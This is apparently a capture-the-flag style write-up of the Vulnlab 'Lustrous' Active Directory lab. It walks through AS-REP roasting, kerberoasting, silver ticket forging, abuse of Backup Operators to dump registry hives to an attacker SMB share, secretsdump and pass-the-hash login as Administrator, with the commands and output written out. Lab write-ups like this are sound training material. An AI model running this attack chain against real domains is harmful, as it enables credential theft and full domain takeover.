# Lustrous
![](images/lustrous.png)


IPs: `10.10.186.5` `10.10.186.6`

# Recon
Nmap:
10.10.186.5 - LusDC.lustrous.vl
```
21/tcp   open  ftp           Microsoft ftpd
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-07 10:05:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```


10.10.186.6 - LusMS.lustrous.vl
```
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```


FTP:
Anonymous auth is allowed and in the directory there are 4 potential users:
```
ben.cox
rachel.parker
tony.ward
wayne.taylor
```

# Foothold
Going to try asreproasting.
```
GetNPUsers.py -no-pass -usersfile ~/vulnlab/lustrous/users.txt lustrous.vl/

$krb5asrep$23$ben.cox@LUSTROUS.VL:7c8ba100fb64758aaae0b5e3ac5c30ac$b7919abb1a2c111bdac822955214a080aaef77f20e70295e061600b83c625c696292eae4c291357e1e536b2dce0fbb4da175d6a275c8955426b8db7ae74fab7e6fc2ca2184e37e7021e10c976428bbe816474da75a3d0f027c226fc1b225b3c9125a70e824ddf2c4312414a84977697999225cc793d8feb6c6af131d81245a0d31cf874795c30185e733852a4904e8099fe1f78edcdf2e33ade2cb10e5301daa81874d6deb2bdff57de56c88ef39503d289f410ae3ab9482d9dfc086b4f6157d5110ec9c46a272938006d36c4fca42dbc09c2378ae83c82266cca9bd2d2d3d71a84f3a56c1398210b2f6
```

This cracks to `Trinity1`

# LDAP Analysis
As we now have domain creds, and there isnt any more low hanging fruit I'm going to run a bloodhound scan:
```
./bloodhound.py -d lustrous.vl -u ben.cox -p Trinity1 -c all -ns 10.10.186.5 --zip -dc LusDC.lustrous.vl
```

There are 2 kerberoastable accounts, being:
```
svc_db
svc_web
```

The tony.ward user has generic write over the domain admins group, and is also a member of the backup operators.

# Lateral Movement
The `svc_web` account has a SPN for `http://lusdc.lustrous.vl`, going to this site returns a 401 due to invalid creds. If we are able to compromise this account via kerberoasting we should be able to auth to the web app using kerberos.
```
GetUserSPNs.py lustrous.vl/ben.cox:Trinity1 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName     Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
-----------------------  -------  --------  --------------------------  --------------------------  ----------
http/lusdc.lustrous.vl   svc_web            2021-12-22 23:46:12.670282  2024-10-07 21:05:33.010187             


[-] CCache file is not found. Skipping...
... snip ...
```

This ticket also cracks to `iydgTvmujl6f`. Using this we can create a silver ticket for any user to auth to the web application. I'm going to use the `tony.ward` user as he might have special privs in the context of the web app too.

to do this we need the nthash of service account, the domain sid (from bloodhound) and the user-id (also in bloodhound)

```
$ pypykatz crypto nt iydgTvmujl6f
e67af8b3d78df5a02eb0d57b6cb60717
```

```
$ ticketer.py -nthash e67af8b3d78df5a02eb0d57b6cb60717 -domain-sid S-1-5-21-2355092754-1584501958-1513963426 -domain lustrous.vl -user-id 1114 -spn http/lusdc.lustrous.vl tony.ward
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in tony.ward.ccache
```

Then in firefox update `network.negotiate-auth.trusted-uris` to `https://lusdc.lustrous.vl`, export the ticket and start firefox.

You can also do it via curl:
```
KRB5CCNAME=$(pwd)/tony.ward.ccache curl -k --negotiate -u : https://lusdc.lustrous.vl
```

Going to the /Internal endpoint shows a password reminder note for tony.ward
```
U_cPVQqEI50i1X
```

Checking if its a valid domain credential:
```
nxc ldap lusdc -u tony.ward -p U_cPVQqEI50i1X
SMB         10.10.186.5     445    LUSDC            [*] Windows Server 2022 Build 20348 x64 (name:LUSDC) (domain:lustrous.vl) (signing:True) (SMBv1:False)
LDAP        10.10.186.5     389    LUSDC            [+] lustrous.vl\tony.ward:U_cPVQqEI50i1X (Pwn3d!)
```

# Domain Admin
As `tony.ward` is a member of the backup operators we can use `reg.py` to dump the SAM and SECURITY hives. To do this we have to start a smbserver
```
$ smbserver.py -smb2support share ~/vulnlab/lustrous/

$ reg.py lustrous.vl/tony.ward:U_cPVQqEI50i1X@lusdc backup -o \\\\10.8.0.110\\share
```

This was very unstable and I couldnt get it to work, so instead, I'm going to do it from a windows machine. What we can do is login via winrm as ben.cox and then  use runas to execute BackupOperators.cpp as tony.ward to exfiltrate the hives.

updating the machine name on line 31 in `BackupOperators.cpp` and its good to go.

```
.\runascs.exe tony.ward U_cPVQqEI50i1X -d lustrous.vl C:\Windows\Tasks\backup.exe
Dumping SAM hive to C:\windows\temp\sam.hive
Dumping SYSTEM hive to C:\windows\temp\system.hive
Dumping SECURITY hive to C:\windows\temp\security.hive
```

Then just grab the files with smbclient, make sure you are in the `C:\Windows\temp` folder when grabbing the files due to windows icacls on the temp folder.

Then dumping the machine hash
```
secretsdump.py LOCAL -sam ~/vulnlab/lustrous/sam.hive -system ~/vulnlab/lustrous/system.hive -security ~/vulnlab/lustrous/security.hive 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

... snip ...
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7f5111dad29fb429fe1222126a156a63
```

Now we can grab the DA hash.
```
$ secretsdump.py -hashes :7f5111dad29fb429fe1222126a156a63 lustrous.vl/LUSDC\$@lusdc                                                    
... snip ...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b8d9c7bd6de2a14237e0eff1afda2476::: 
```

Finally login with evil-winrm
```
evil-winrm -u Administrator -H b8d9c7bd6de2a14237e0eff1afda2476 -i lusdc

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
lustrous\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
LusDC
```

Fin
# Beyond Root
Had a lot of fun, got stuck trying to dump the registries remotely with reg.py for some reason the server kept closing the connection. I also played around with changing BackupOperators.cpp to dump to a share, which worked.

There is also a cool trick to kerberoast a user from an asrep ticket, which would have been useful if the ben.cox ticket didnt crack, you would then also have to set up a windows box so you could dump the sam and system hives. This should still work as you can add a DNS entry to a random ip by default in AD.
